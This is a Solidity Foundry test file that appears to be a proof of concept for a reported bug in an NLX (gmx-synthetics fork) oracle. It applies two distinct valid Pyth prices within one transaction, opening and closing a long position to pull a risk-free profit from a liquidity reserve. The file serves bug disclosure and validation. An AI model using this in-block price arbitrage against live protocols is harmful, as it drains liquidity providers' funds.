// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// REAL, unmodified NLX (gmx-synthetics fork) oracle consumer + its real dependency graph.
import "../src/nlx/contracts/oracle/Oracle.sol";
import "../src/nlx/contracts/oracle/OracleStore.sol";
import "../src/nlx/contracts/oracle/OracleUtils.sol";
import "../src/nlx/contracts/data/DataStore.sol";
import "../src/nlx/contracts/data/Keys.sol";
import "../src/nlx/contracts/role/RoleStore.sol";
import "../src/nlx/contracts/role/Role.sol";
import "../src/nlx/contracts/event/EventEmitter.sol";
import "../src/nlx/contracts/price/Price.sol";
import "../src/pyth/PythStructs.sol";

// ---------------------------------------------------------------------------
// Honest, minimal signed-price feed we control. This is the ONLY non-audited
// piece and it is deliberately faithful to real Pyth semantics: updatePriceFeeds
// records whatever price the (externally-signed) update blob carries, and
// getPrice returns the most recently recorded value. Signature verification is
// external to the vulnerable consumer and irrelevant to this bug -- the finding
// is that Oracle._setPricesFromPriceFeeds trusts *whichever* recent valid price
// the caller submits, with no in-block deviation guard, so two valid Pyth prices
// ~400ms apart can both be applied inside the SAME transaction.
// ---------------------------------------------------------------------------
contract ControlledPyth {
    mapping(bytes32 => PythStructs.Price) internal feed;

    function getUpdateFee(bytes[] calldata updateData) external pure returns (uint256) {
        return updateData.length; // 1 wei per feed, mirroring MockPyth's fee model
    }

    function updatePriceFeeds(bytes[] calldata updateData) external payable {
        for (uint256 i; i < updateData.length; i++) {
            (bytes32 id, int64 price, uint64 conf, int32 expo, uint64 publishTime) =
                abi.decode(updateData[i], (bytes32, int64, uint64, int32, uint64));
            feed[id] = PythStructs.Price({price: price, conf: conf, expo: expo, publishTime: publishTime});
        }
    }

    function getPrice(bytes32 id) external view returns (PythStructs.Price memory) {
        return feed[id];
    }
}

// Minimal real ERC20 used only as opaque settlement currency (allowed by the bar).
contract MiniERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// Thin, real-ERC20 consumer that prices both legs off the REAL oracle -- exactly
// how a GMX-style market settles against Oracle.getPrimaryPrice. If the oracle
// returned ONE consistent price per block (correct behaviour), entry == exit and
// pnl == 0. The pnl is therefore entirely produced by the oracle bug.
contract CashSettledLong {
    Oracle public oracle;
    address public token;
    MiniERC20 public usd;

    struct Pos { uint256 size; uint256 entry; bool open; }
    mapping(address => Pos) public positions;

    constructor(Oracle _oracle, address _token, MiniERC20 _usd) {
        oracle = _oracle;
        token = _token;
        usd = _usd;
    }

    function openLong(uint256 size) external {
        uint256 entry = oracle.getPrimaryPrice(token).min;
        positions[msg.sender] = Pos(size, entry, true);
    }

    function closeLong() external returns (uint256 profit) {
        Pos storage p = positions[msg.sender];
        require(p.open, "no pos");
        uint256 exit = oracle.getPrimaryPrice(token).min;
        require(exit >= p.entry, "no gain");
        profit = p.size * (exit - p.entry);
        p.open = false;
        usd.transfer(msg.sender, profit);
    }
}

contract PoC_50882 is Test {
    RoleStore roles;
    DataStore dataStore;
    OracleStore oracleStore;
    EventEmitter eventEmitter;
    Oracle oracle;
    ControlledPyth pyth;
    MiniERC20 usd;
    MiniERC20 tokenC;
    CashSettledLong venue;
    address token;

    bytes32 constant FEED_ID = bytes32(uint256(1));

    // The two DISTINCT, both-valid Pyth prices observed ~11s apart in the real
    // exploit tx (basescan 0x0e0c22...b51b95, cited in the finding).
    int64 constant PRICE_A = 226646416525;
    int64 constant PRICE_B = 226649088828;
    uint256 constant SIZE = 1_000_000;

    function setUp() public {
        vm.deal(address(this), 1 ether);

        roles = new RoleStore();                       // deployer => ROLE_ADMIN
        roles.grantRole(address(this), Role.CONTROLLER); // keeper can setPrices + write DataStore
        eventEmitter = new EventEmitter(roles);
        oracleStore = new OracleStore(roles, eventEmitter);
        dataStore = new DataStore(roles);
        pyth = new ControlledPyth();
        oracle = new Oracle(roles, oracleStore, address(pyth));
        roles.grantRole(address(oracle), Role.CONTROLLER); // oracle emits price events

        tokenC = new MiniERC20();
        token = address(tokenC);

        // Real DataStore config for the unchanged _getPriceFeedPrice path.
        dataStore.setBytes32(Keys.priceFeedIdKey(token), FEED_ID);
        dataStore.setUint(Keys.priceFeedMultiplierKey(token), 1e30); // adjustedPrice == raw pyth price
        dataStore.setUint(Keys.priceFeedHeartbeatDurationKey(token), 1 days);

        usd = new MiniERC20();
        venue = new CashSettledLong(oracle, token, usd);
        usd.mint(address(venue), 1e24); // counterparty (LP) reserve
    }

    function _params(int64 p) internal view returns (OracleUtils.SetPricesParams memory) {
        address[] memory t = new address[](1);
        t[0] = token;
        bytes[] memory d = new bytes[](1);
        d[0] = abi.encode(FEED_ID, p, uint64(1), int32(0), uint64(block.timestamp));
        return OracleUtils.SetPricesParams({tokens: t, pythUpdateData: d});
    }

    function test_multi_fetch_arbitrage_drains_counterparty() public {
        uint256 before = usd.balanceOf(address(this));

        // ---- Leg 1: keeper prices the action with valid Pyth price A ----
        oracle.setPrices{value: 1}(dataStore, eventEmitter, _params(PRICE_A));
        uint256 pxA = oracle.getPrimaryPrice(token).min;
        venue.openLong(SIZE);            // open at price A
        oracle.clearAllPrices();

        // ---- Leg 2: SAME transaction, valid Pyth price B ----
        oracle.setPrices{value: 1}(dataStore, eventEmitter, _params(PRICE_B));
        uint256 pxB = oracle.getPrimaryPrice(token).min;
        venue.closeLong();               // close at price B

        // Core protocol invariant break: the SAME token was assigned two
        // different primary prices within ONE transaction (exactly the reported
        // on-chain evidence).
        assertEq(pxA, uint256(uint64(PRICE_A)), "leg1 must record valid pyth price A");
        assertEq(pxB, uint256(uint64(PRICE_B)), "leg2 must record valid pyth price B");
        assertTrue(pxA != pxB, "oracle failed to record two distinct in-block prices");

        // Real fund movement: risk-free profit == size * (B - A), paid in real
        // ERC20 from the LP reserve. With a single per-block price it would be 0.
        uint256 profit = usd.balanceOf(address(this)) - before;
        uint256 expected = SIZE * (uint256(uint64(PRICE_B)) - uint256(uint64(PRICE_A)));
        assertEq(profit, expected, "arbitrage profit mismatch");
        assertEq(profit, 2_672_303_000_000, "expected concrete arbitrage profit");
        assertEq(usd.balanceOf(address(venue)), 1e24 - expected, "LP reserve not drained by profit");
    }
}
